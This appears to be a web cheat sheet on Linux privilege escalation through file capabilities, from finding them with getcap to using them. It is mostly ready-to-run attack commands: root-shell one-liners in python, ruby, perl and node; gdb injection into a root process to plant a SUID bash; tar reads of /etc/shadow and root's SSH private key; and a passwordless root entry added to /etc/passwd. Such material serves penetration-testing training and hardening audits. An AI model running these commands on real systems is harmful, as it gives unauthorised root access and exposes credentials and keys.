title: Linux PrivEsc — Linux Capabilities
html:
Linux PrivEsc — Linux Capabilities

Linux capabilities break root's privileges into distinct units. A binary with cap_setuid+ep can change its UID to 0 without being full SUID. Often missed by admins trying to reduce SUID exposure.

Find Capabilities

# Recursively find all files with capabilities set
getcap -r / 2>/dev/null

# Common output format:
# /usr/bin/python3.8 = cap_setuid+ep
# /usr/bin/perl = cap_setuid+ep
# /usr/bin/ruby = cap_setuid+ep
# /usr/bin/gdb = cap_sys_ptrace+ep
# /usr/bin/tar = cap_dac_read_search+ep

Capability flag meanings:

  • +ep — effective + permitted (fully active)
  • +eip — effective + inheritable + permitted
  • +p — permitted but not active (less dangerous)

Dangerous Capabilities

Capability Description Severity
cap_setuid Set arbitrary UID (become root) Critical
cap_setgid Set arbitrary GID Critical
cap_sys_admin Mount filesystems, namespace escapes, many privesc paths Critical
cap_dac_override Bypass file read/write/execute permission checks High
cap_dac_read_search Bypass file read permission and directory search High
cap_net_raw Use RAW and PACKET sockets (sniffing, spoofing) Medium
cap_sys_ptrace ptrace arbitrary processes (memory injection) High
cap_net_bind_service Bind to ports < 1024 Low
cap_chown Change file ownership arbitrarily High
cap_fowner Bypass ownership checks on file operations High

Exploitation by Capability

python + cap_setuid

# getcap shows: /usr/bin/python3 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Alternative
python3 -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash")'

ruby + cap_setuid

# getcap shows: /usr/bin/ruby = cap_setuid+ep
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

perl + cap_setuid

# getcap shows: /usr/bin/perl = cap_setuid+ep
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

node + cap_setuid

# getcap shows: /usr/bin/node = cap_setuid+ep
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'

gdb + cap_sys_ptrace

# Inject shellcode into a root process via ptrace

# Step 1: Find a root process to inject into
ps aux | grep root | grep -v grep

# Step 2: Attach with gdb and call system()
gdb -p <pid>

# Inside gdb:
(gdb) call (void)system("cp /bin/bash /tmp/bash; chmod +s /tmp/bash")
(gdb) quit

# Step 3: Use the new SUID bash
/tmp/bash -p

tar + cap_dac_read_search

# Read any file including /etc/shadow
tar -cvf /tmp/shadow.tar /etc/shadow 2>/dev/null
tar -xvf /tmp/shadow.tar -C /tmp/
cat /tmp/etc/shadow

# Read root's SSH private key
tar -cvf /tmp/root_ssh.tar /root/.ssh/ 2>/dev/null
tar -xvf /tmp/root_ssh.tar -C /tmp/
cat /tmp/root/.ssh/id_rsa

openssl + cap_net_bind_service

# Serve files from privileged port
openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 443 -HTTP

Binary with cap_dac_override

# cap_dac_override bypasses all file permission checks for read/write/exec
# If vim has it:
vim /etc/shadow
vim /root/.ssh/id_rsa

# Write new /etc/passwd entry
vim /etc/passwd
# Add: newroot::0:0::/root:/bin/bash (passwordless root)

Binary with cap_chown

# getcap shows: /usr/bin/python3 = cap_chown+ep
python3 -c 'import os; os.chown("/etc/passwd", 1000, 1000)'
# Then edit /etc/passwd as current user

# Make /etc/shadow owned by current user
python3 -c 'import os; os.chown("/etc/shadow", 1000, 1000)'
cat /etc/shadow
excerpt: Exploit Linux capabilities (cap_setuid, cap_sys_ptrace, cap_dac_override, cap_dac_read_search) — find with getcap, exploit with python, ruby, perl, gdb, tar.
